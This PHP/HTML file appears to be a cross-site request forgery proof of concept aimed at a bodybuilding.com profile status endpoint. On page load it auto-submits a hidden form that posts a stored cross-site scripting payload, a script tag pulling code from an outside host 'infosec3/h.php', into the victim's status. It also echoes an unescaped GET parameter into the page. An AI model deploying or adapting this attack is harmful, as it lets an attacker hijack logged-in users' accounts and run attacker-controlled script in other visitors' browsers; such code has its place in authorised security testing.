<?php
header('Content-type: text/html');
?>
<html>
<body>
<!--
cs("http://my.bodybuilding.com/community/my-bodyspace/?23-1.IBehaviorListener.0-superbox-fitStatusForm-saveFitStatus?fitStatusText=FROM_SCRIPT&saveFitStatus=1");
-->
<form id="cspost" action="<?=$_GET['action']?>" method="POST">
<input type="hidden" name="fitStatusText" value="<script src='http://infosec3/h.php'><script>But most of all, Cory is my hero" />
<input type="hidden" name="saveFitStatus" value="1" />
<input type="Submit" value="Post" id="csubmit" />
</form>
<script>console.log("CS POST!: " + <?=$_GET['action']?>);  document.getElementById("cspost").submit();</script>
</body>
</html>
